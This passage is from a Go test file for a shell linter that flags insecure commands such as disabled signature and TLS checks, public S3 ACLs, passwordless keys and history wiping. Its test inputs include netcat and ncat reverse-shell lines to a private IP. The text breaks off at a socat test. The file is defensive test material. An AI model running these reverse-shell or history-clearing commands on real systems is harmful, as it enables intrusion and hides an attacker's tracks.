			input: `apt install --allow-downgrades foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1468",
					Message: "APT installing unsigned or override-policy packages (--allow-downgrades) — disables signature verification, MITM-to-root trivial.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1468")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1469(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — dnf install curl",
			input:    `dnf install curl`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — rpm -i package.rpm",
			input:    `rpm -i package.rpm`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — dnf install --nogpgcheck foo",
			input: `dnf install --nogpgcheck foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1469",
					Message: "Package signature verification disabled (dnf --nogpgcheck) — any mirror / MITM becomes immediate root.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — yum install --nogpgcheck foo",
			input: `yum install --nogpgcheck foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1469",
					Message: "Package signature verification disabled (yum --nogpgcheck) — any mirror / MITM becomes immediate root.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — rpm -i --nosignature foo.rpm",
			input: `rpm -i --nosignature foo.rpm`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1469",
					Message: "Package signature verification disabled (rpm --nosignature) — any mirror / MITM becomes immediate root.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — zypper install --no-gpg-checks foo",
			input: `zypper install --no-gpg-checks foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1469",
					Message: "Package signature verification disabled (zypper --no-gpg-checks) — any mirror / MITM becomes immediate root.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1469")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1470(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — git clone https",
			input:    `git clone https://example.com/x.git`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — git config http.sslVerify true",
			input:    `git config http.sslVerify true`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — git config http.sslVerify false",
			input: `git config http.sslVerify false`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1470",
					Message: "`http.sslVerify=false` disables TLS verification — any MITM swaps the clone for attacker code. Fix the CA instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — git config --global http.sslVerify false",
			input: `git config --global http.sslVerify false`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1470",
					Message: "`http.sslVerify=false` disables TLS verification — any MITM swaps the clone for attacker code. Fix the CA instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — git -c http.sslVerify=false clone",
			input: `git -c http.sslVerify=false clone https://example.com/x.git`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1470",
					Message: "`http.sslVerify=false` disables TLS verification — any MITM swaps the clone for attacker code. Fix the CA instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1470")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1471(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — kubectl get pods",
			input:    `kubectl get pods`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — helm install nginx bitnami/nginx",
			input:    `helm install nginx bitnami/nginx`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — kubectl get pods --insecure-skip-tls-verify",
			input: `kubectl get pods --insecure-skip-tls-verify`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1471",
					Message: "`--insecure-skip-tls-verify` turns off API-server certificate verification — MITM steals every secret. Fix the CA bundle instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — helm install --insecure-skip-tls-verify=true foo",
			input: `helm install --insecure-skip-tls-verify=true foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1471",
					Message: "`--insecure-skip-tls-verify` turns off API-server certificate verification — MITM steals every secret. Fix the CA bundle instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — oc login --insecure-skip-tls-verify=true",
			input: `oc login --insecure-skip-tls-verify=true https://cluster`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1471",
					Message: "`--insecure-skip-tls-verify` turns off API-server certificate verification — MITM steals every secret. Fix the CA bundle instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1471")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1472(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — aws s3 cp file bucket without ACL",
			input:    `aws s3 cp file s3://bucket/`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — aws s3 cp --acl private",
			input:    `aws s3 cp file s3://bucket/ --acl private`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — aws s3 cp --acl public-read",
			input: `aws s3 cp file s3://bucket/ --acl public-read`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1472",
					Message: "Canned ACL `public-read` makes the object (often the bucket) world-readable. Use a scoped bucket policy instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — aws s3 sync --acl=public-read-write",
			input: `aws s3 sync ./ s3://bucket/ --acl=public-read-write`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1472",
					Message: "Canned ACL `public-read-write` makes the object (often the bucket) world-readable. Use a scoped bucket policy instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — aws s3api put-bucket-acl --acl public-read",
			input: `aws s3api put-bucket-acl --bucket foo --acl public-read`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1472",
					Message: "Canned ACL `public-read` makes the object (often the bucket) world-readable. Use a scoped bucket policy instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1472")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1473(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — openssl req with -aes256",
			input:    `openssl req -newkey rsa:4096 -aes256 -keyout key.pem -out csr.pem`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — openssl x509 (not key-producing)",
			input:    `openssl x509 -in cert.pem -noout -subject`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — openssl req -nodes",
			input: `openssl req -newkey rsa:4096 -nodes -keyout key.pem -out csr.pem`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1473",
					Message: "`-nodes` writes the private key to disk unencrypted. Use `-aes256` (or an HSM/TPM) and keep the passphrase in a secrets store.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — openssl genrsa with -noenc",
			input: `openssl genrsa -noenc -out key.pem 4096`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1473",
					Message: "`-noenc` writes the private key to disk unencrypted. Use `-aes256` (or an HSM/TPM) and keep the passphrase in a secrets store.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1473")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1474(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — ssh-keygen -N passphrase",
			input:    `ssh-keygen -N secretpass -f key`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — ssh-keygen without -N",
			input:    `ssh-keygen -t ed25519 -f key`,
			expected: []katas.Violation{},
		},
		{
			name:  `invalid — ssh-keygen -N "" -f key`,
			input: `ssh-keygen -N "" -f key`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1474",
					Message: "`ssh-keygen -N \"\"` generates a passwordless key — anything that reads the file can use it. Use a passphrase or ssh-agent/HSM.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  `invalid — ssh-keygen -N '' -f key`,
			input: `ssh-keygen -N '' -f key`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1474",
					Message: "`ssh-keygen -N \"\"` generates a passwordless key — anything that reads the file can use it. Use a passphrase or ssh-agent/HSM.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1474")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1475(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — setcap cap_net_bind_service",
			input:    `setcap cap_net_bind_service+ep /usr/bin/node`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — setcap cap_sys_admin+ep",
			input: `setcap cap_sys_admin+ep /usr/bin/foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1475",
					Message: "`setcap` granting dangerous capability `cap_sys_admin` makes the binary a privesc vector for any executing user. Scope narrower or use a dedicated service user.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — setcap cap_dac_override+ep",
			input: `setcap cap_dac_override+ep /usr/bin/filedump`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1475",
					Message: "`setcap` granting dangerous capability `cap_dac_override` makes the binary a privesc vector for any executing user. Scope narrower or use a dedicated service user.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — setcap cap_setuid+ep",
			input: `setcap 'cap_setuid=+ep' /usr/bin/maybebad`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1475",
					Message: "`setcap` granting dangerous capability `cap_setuid` makes the binary a privesc vector for any executing user. Scope narrower or use a dedicated service user.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1475")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1476(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — apt-key list (read-only)",
			input:    `apt-key list`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — apt-key export",
			input:    `apt-key export ABCD`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — apt-key add -",
			input: `apt-key add -`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1476",
					Message: "`apt-key add` adds to a global keyring that signs every repo. Use `/etc/apt/keyrings/<vendor>.gpg` + `signed-by=` instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — apt-key adv --recv-keys",
			input: `apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ABCD`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1476",
					Message: "`apt-key adv` adds to a global keyring that signs every repo. Use `/etc/apt/keyrings/<vendor>.gpg` + `signed-by=` instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1476")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1477(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — printf '%s\\n' \"$x\"",
			input:    `printf '%s\n' "$x"`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — printf \"%s\\n\" \"$x\"",
			input:    `printf "%s\n" "$x"`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — printf 'hello world'",
			input:    `printf 'hello world'`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — printf \"$x\"",
			input: `printf "$x"`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1477",
					Message: "`printf` format string contains a variable — `%` inside `$var` is reparsed as a format specifier. Use `printf '%s' \"$var\"` instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — printf \"$(cmd)\"",
			input: `printf "$(cmd)"`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1477",
					Message: "`printf` format string contains a variable — `%` inside `$var` is reparsed as a format specifier. Use `printf '%s' \"$var\"` instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1477")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1478(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — mktemp (default)",
			input:    `mktemp`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — mktemp -d",
			input:    `mktemp -d`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — mktemp -u",
			input: `mktemp -u`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1478",
					Message: "`mktemp -u` returns a unique name but does not create the file — TOCTOU race. Let `mktemp` create the file (or use `-d` for a directory).",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — mktemp -u -t foo.XXXX",
			input: `mktemp -u -t foo.XXXX`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1478",
					Message: "`mktemp -u` returns a unique name but does not create the file — TOCTOU race. Let `mktemp` create the file (or use `-d` for a directory).",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1478")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1479(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — ssh user@host",
			input:    `ssh user@host`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — ssh -o StrictHostKeyChecking=accept-new",
			input:    `ssh -o StrictHostKeyChecking=accept-new user@host`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — ssh -o StrictHostKeyChecking=no",
			input: `ssh -o StrictHostKeyChecking=no user@host`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1479",
					Message: "`StrictHostKeyChecking=no` disables SSH host-key verification — first MITM owns the connection. Pin the fingerprint in known_hosts instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — scp -oStrictHostKeyChecking=no (joined)",
			input: `scp -oStrictHostKeyChecking=no file user@host:`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1479",
					Message: "`StrictHostKeyChecking=no` disables SSH host-key verification — first MITM owns the connection. Pin the fingerprint in known_hosts instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — ssh -oUserKnownHostsFile=/dev/null",
			input: `ssh -oUserKnownHostsFile=/dev/null user@host`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1479",
					Message: "`UserKnownHostsFile=/dev/null` disables SSH host-key verification — first MITM owns the connection. Pin the fingerprint in known_hosts instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1479")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1480(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — terraform plan",
			input:    `terraform plan`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — terraform apply (interactive)",
			input:    `terraform apply`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — terraform apply -auto-approve",
			input: `terraform apply -auto-approve`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1480",
					Message: "`terraform apply -auto-approve` skips plan review. Gate behind a branch/env check or require manual approval.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — terraform destroy --auto-approve",
			input: `terraform destroy --auto-approve`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1480",
					Message: "`terraform destroy --auto-approve` skips plan review. Gate behind a branch/env check or require manual approval.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — tofu apply -auto-approve",
			input: `tofu apply -auto-approve`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1480",
					Message: "`tofu apply -auto-approve` skips plan review. Gate behind a branch/env check or require manual approval.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1480")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1481(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — unset TMPDIR",
			input:    `unset TMPDIR`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — export HISTFILE=~/.zsh_history",
			input:    `export HISTFILE=~/.zsh_history`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — unset HISTFILE",
			input: `unset HISTFILE`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1481",
					Message: "`unset HISTFILE` disables shell history — textbook post-compromise tactic. Legitimate alternative: `HISTCONTROL=ignorespace` plus leading-space prefix.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — export HISTFILE=/dev/null",
			input: `export HISTFILE=/dev/null`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1481",
					Message: "`HISTFILE=/dev/null` disables shell history — textbook post-compromise tactic. Legitimate alternative: `HISTCONTROL=ignorespace` plus leading-space prefix.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — export HISTSIZE=0",
			input: `export HISTSIZE=0`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1481",
					Message: "`HISTSIZE=0` disables shell history — textbook post-compromise tactic. Legitimate alternative: `HISTCONTROL=ignorespace` plus leading-space prefix.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1481")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1482(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker login --password-stdin",
			input:    `docker login --password-stdin -u user registry`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — docker push (not login)",
			input:    `docker push -p registry/image`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker login -p pass",
			input: `docker login -u user -p secretpass registry`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1482",
					Message: "`-p secretpass` puts the password in ps / /proc / history. Use `--password-stdin` piped from a secrets file or credential helper.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — docker login --password=pass",
			input: `docker login --password=secretpass -u user`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1482",
					Message: "`--password=secretpass` puts the password in ps / /proc / history. Use `--password-stdin` piped from a secrets file or credential helper.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — helm registry login -p",
			input: `helm registry login -u user -p secret example.com`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1482",
					Message: "`-p secret` puts the password in ps / /proc / history. Use `--password-stdin` piped from a secrets file or credential helper.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1482")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1483(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — pip install in venv",
			input:    `pip install requests`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — pip install --user",
			input:    `pip install --user requests`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — pip install --break-system-packages",
			input: `pip install --break-system-packages requests`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1483",
					Message: "`--break-system-packages` installs into distro-managed paths and collides with apt/dnf. Use a venv, pipx, or uv/poetry instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — pip3 install --break-system-packages",
			input: `pip3 install --break-system-packages foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1483",
					Message: "`--break-system-packages` installs into distro-managed paths and collides with apt/dnf. Use a venv, pipx, or uv/poetry instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1483")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1484(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — npm config set cafile /path",
			input:    `npm config set cafile /etc/ssl/ca.pem`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — npm config set strict-ssl true",
			input:    `npm config set strict-ssl true`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — npm config set strict-ssl false",
			input: `npm config set strict-ssl false`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1484",
					Message: "`strict-ssl=false` disables npm/yarn/pnpm registry TLS verification — any MITM swaps packages. Point `cafile` at the right CA bundle instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — yarn config set --global strict-ssl false",
			input: `yarn config set --global strict-ssl false`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1484",
					Message: "`strict-ssl=false` disables npm/yarn/pnpm registry TLS verification — any MITM swaps packages. Point `cafile` at the right CA bundle instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — npm install --strict-ssl=false",
			input: `npm install foo --strict-ssl=false`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1484",
					Message: "`strict-ssl=false` disables npm/yarn/pnpm registry TLS verification — any MITM swaps packages. Point `cafile` at the right CA bundle instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1484")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1485(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — openssl s_client -tls1_3",
			input:    `openssl s_client -tls1_3 -connect host:443`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — openssl x509 (not s_client/s_server)",
			input:    `openssl x509 -ssl3 -noout`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — openssl s_client -ssl3",
			input: `openssl s_client -ssl3 -connect host:443`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1485",
					Message: "`openssl s_client -ssl3` forces a legacy / disabled TLS version (downgrade-attack surface). Update the remote instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — openssl s_client -tls1",
			input: `openssl s_client -tls1 -connect host:443`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1485",
					Message: "`openssl s_client -tls1` forces a legacy / disabled TLS version (downgrade-attack surface). Update the remote instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — openssl s_server -tls1_1",
			input: `openssl s_server -tls1_1 -cert cert.pem`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1485",
					Message: "`openssl s_server -tls1_1` forces a legacy / disabled TLS version (downgrade-attack surface). Update the remote instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1485")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1486(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — curl https://host",
			input:    `curl https://host`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — curl -1 (TLSv1+)",
			input:    `curl -1 https://host`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — curl -2 (SSLv2)",
			input: `curl -2 https://host`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1486",
					Message: "`curl -2` forces SSLv2/SSLv3 — removed from modern TLS libraries and subject to POODLE. Fix the server instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — curl -3 (SSLv3)",
			input: `curl -3 https://host`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1486",
					Message: "`curl -3` forces SSLv2/SSLv3 — removed from modern TLS libraries and subject to POODLE. Fix the server instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1486")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1487(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — history (list)",
			input:    `history`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — history 10",
			input:    `history 10`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — history -c",
			input: `history -c`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1487",
					Message: "`history -c` is a Bash-ism for clearing history — does nothing in Zsh and is a classic post-compromise tactic elsewhere.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — history -d 1",
			input: `history -d 1`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1487",
					Message: "`history -d` is a Bash-ism for clearing history — does nothing in Zsh and is a classic post-compromise tactic elsewhere.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1487")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1488(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — ssh -R 2222:localhost:22 host (default bind)",
			input:    `ssh -R 2222:localhost:22 host`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — ssh -R 127.0.0.1:2222:localhost:22 host",
			input:    `ssh -R 127.0.0.1:2222:localhost:22 host`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — ssh -R 0.0.0.0:2222:localhost:22 host",
			input: `ssh -R 0.0.0.0:2222:localhost:22 host`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1488",
					Message: "SSH reverse tunnel bound to all interfaces (`0.0.0.0:2222:localhost:22`) — forwarded port reachable from any network. Bind to a specific IP.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — ssh -D 0.0.0.0:1080 host (dynamic SOCKS)",
			input: `ssh -D 0.0.0.0:1080 host`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1488",
					Message: "SSH reverse tunnel bound to all interfaces (`0.0.0.0:1080`) — forwarded port reachable from any network. Bind to a specific IP.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1488")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1489(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — nc -l 4444",
			input:    `nc -l 4444`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — nc host 443",
			input:    `nc example.com 443`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — nc -e /bin/sh",
			input: `nc -e /bin/sh 10.0.0.1 4444`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1489",
					Message: "`nc -e` is the classic reverse-shell flag. Use socat with explicit PTY + authorization instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — ncat -e /bin/bash",
			input: `ncat -e /bin/bash 10.0.0.1 4444`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1489",
					Message: "`ncat -e` is the classic reverse-shell flag. Use socat with explicit PTY + authorization instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — ncat -c 'bash -i'",
			input: `ncat -c 'bash -i' 10.0.0.1 4444`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1489",
					Message: "`ncat -c` is the classic reverse-shell flag. Use socat with explicit PTY + authorization instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1489")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1490(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — socat - TCP:host:port",
			input:    `socat - TCP:example.com:443`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — socat with EXEC:custom-tool",
			input:    `socat TCP-LISTEN:8080,fork EXEC:/usr/local/bin/backend`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — socat TCP:... EXEC:/bin/bash",
